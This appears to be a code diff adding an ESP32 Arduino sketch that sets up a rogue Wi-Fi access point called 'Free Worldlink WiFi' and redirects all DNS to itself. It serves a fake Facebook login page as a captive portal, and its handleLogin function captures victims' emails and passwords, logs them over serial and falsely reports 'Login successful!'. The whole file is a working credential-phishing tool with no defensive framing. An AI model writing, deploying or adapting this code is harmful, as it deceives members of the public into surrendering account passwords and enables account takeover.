@@ -1,0 +1,87 @@
+const int LED_PIN = 2; // Common ESP32 built-in LED pin
+bool ledState = false;
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <SPIFFS.h>
+const byte DNS_PORT = 53;
+DNSServer dnsServer;
+WebServer webServer(80);
+
+const char* ssid = "Free Worldlink WiFi";  // AP SSID
+const char* password = "12345678"; // AP password
+
+void blinkLED(int times, int delayMs) {
+  for(int i=0; i<times; i++) {
+    digitalWrite(LED_PIN, HIGH);
+    delay(delayMs);
+    digitalWrite(LED_PIN, LOW);
+    delay(delayMs);
+  }
+}
+void updateLEDStatus() {
+  // Toggle LED every 2 seconds
+  static unsigned long lastToggle = 0;
+  if(millis() - lastToggle > 2000) {
+    ledState = !ledState;
+    digitalWrite(LED_PIN, ledState);
+    lastToggle = millis();
+  }
+}
+
+void setup() {
+  pinMode(LED_PIN, OUTPUT);
+  digitalWrite(LED_PIN, LOW); // Initialize OFF
+  Serial.begin(115200);
+  
+  // Start access point
+  WiFi.softAP(ssid, password);
+  blinkLED(3, 200);
+  Serial.println("AP started");
+  Serial.print("AP IP: ");
+  Serial.println(WiFi.softAPIP());
+
+  // Setup DNS server
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP()); // Redirect all DNS to own IP
+
+  // Web server handlers
+  webServer.on("/", handlePortal);
+  webServer.on("/login", handleLogin);
+  webServer.onNotFound(handlePortal); // Redirect all unknown requests
+  
+  webServer.begin();
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  updateLEDStatus(); // Add LED status updates
+}
+
+void handlePortal() {
+  // Captive portal page
+  String content = "<html><body>";
+  content += "<h1>Connect to Internet (Facebook) </h1>";
+  content += "<form action='/login' method='POST'>";
+  content += "Email: <input type='text' name='email'><br>";
+  content += "Password: <input type='password' name='password'><br>";
+  content += "<input type='submit' value='Login'></form>";
+  content += "</body></html>";
+  
+  webServer.send(200, "text/html", content);
+}
+
+void handleLogin() {
+  String email = webServer.arg("email");
+  String password = webServer.arg("password");
+  
+  Serial.println("Captured credentials:");
+  blinkLED(5, 100); // Rapid blink on credential capture
+  digitalWrite(LED_PIN, HIGH); // Keep LED on after capture
+  Serial.print("Email: ");
+  Serial.println(email);
+  Serial.print("Password: ");
+  Serial.println(password);
+
+  webServer.send(200, "text/html", "<html><body>Login successful! You can now access the Internet.</body></html>");
+}
